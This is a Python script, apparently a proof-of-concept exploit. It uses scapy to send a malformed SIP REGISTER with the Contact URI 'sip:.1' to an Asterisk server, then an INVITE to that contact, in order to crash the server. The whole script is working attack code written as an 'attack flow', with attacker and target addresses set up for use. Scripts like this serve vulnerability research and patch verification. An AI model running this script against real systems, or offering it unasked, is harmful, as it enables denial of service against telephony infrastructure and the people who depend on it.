import socket
import time
from scapy.all import *
from scapy.layers.inet import IP, UDP
from threading import Thread

# Configuration
TARGET_IP = "192.168.1.200"  # Change this to the Asterisk server
TARGET_PORT = 5060
LOCAL_IP = "192.168.1.100"  # Change this to the attacker's IP
LOCAL_PORT = 5060  # Listening port for SIP responses

# Set up a UDP listener to capture responses from Asterisk
def sip_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((LOCAL_IP, LOCAL_PORT))
    print(f"[+] Listening for SIP responses on {LOCAL_IP}:{LOCAL_PORT}...\n")

    while True:
        data, addr = sock.recvfrom(4096)
        if data:
            print(f"[RECEIVED] Response from {addr}:\n{data.decode(errors='ignore')}\n")
            if "Contact" in data.decode(errors='ignore') and "sip:.1" in data.decode(errors='ignore'):
                print("[!] Asterisk is attempting to use the malformed Contact URI! Possible crash incoming...")

# Function to send a malformed SIP REGISTER request
def send_malformed_register():
    sip_payload = (
        f"REGISTER sip:{TARGET_IP} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {LOCAL_IP}:{LOCAL_PORT};branch=z9hG4bK123456\r\n"
        f"Max-Forwards: 70\r\n"
        f"From: <sip:attacker@{TARGET_IP}>;tag=12345\r\n"
        f"To: <sip:attacker@{TARGET_IP}>\r\n"
        f"Call-ID: 123456789@{LOCAL_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:.1@{LOCAL_IP}>\r\n"  # Malformed Contact Header
        f"Content-Length: 0\r\n"
        f"\r\n"
    )

    packet = IP(dst=TARGET_IP)/UDP(sport=LOCAL_PORT, dport=TARGET_PORT)/Raw(load=sip_payload)
    send(packet, verbose=True)
    print("[+] Sent malformed REGISTER request with Contact: sip:.1")

# Function to send an INVITE to the registered Contact (sip:.1)
def send_invite_to_malformed_contact():
    time.sleep(5)  # Give Asterisk some time to process the REGISTER request

    sip_payload = (
        f"INVITE sip:.1 SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {LOCAL_IP}:{LOCAL_PORT};branch=z9hG4bK654321\r\n"
        f"Max-Forwards: 70\r\n"
        f"From: <sip:attacker@{TARGET_IP}>;tag=54321\r\n"
        f"To: <sip:bob@{TARGET_IP}>\r\n"
        f"Call-ID: 987654321@{LOCAL_IP}\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Contact: <sip:{LOCAL_IP}:{LOCAL_PORT}>\r\n"
        f"Content-Type: application/sdp\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
    )

    packet = IP(dst=TARGET_IP)/UDP(sport=LOCAL_PORT, dport=TARGET_PORT)/Raw(load=sip_payload)
    send(packet, verbose=True)
    print("[+] Sent INVITE request to sip:.1 to trigger Asterisk crash.")

# Start the listener in a separate thread
listener_thread = Thread(target=sip_listener, daemon=True)
listener_thread.start()

# Execute attack flow
send_malformed_register()
time.sleep(2)  # Allow some time for Asterisk to process the registration
send_invite_to_malformed_contact()
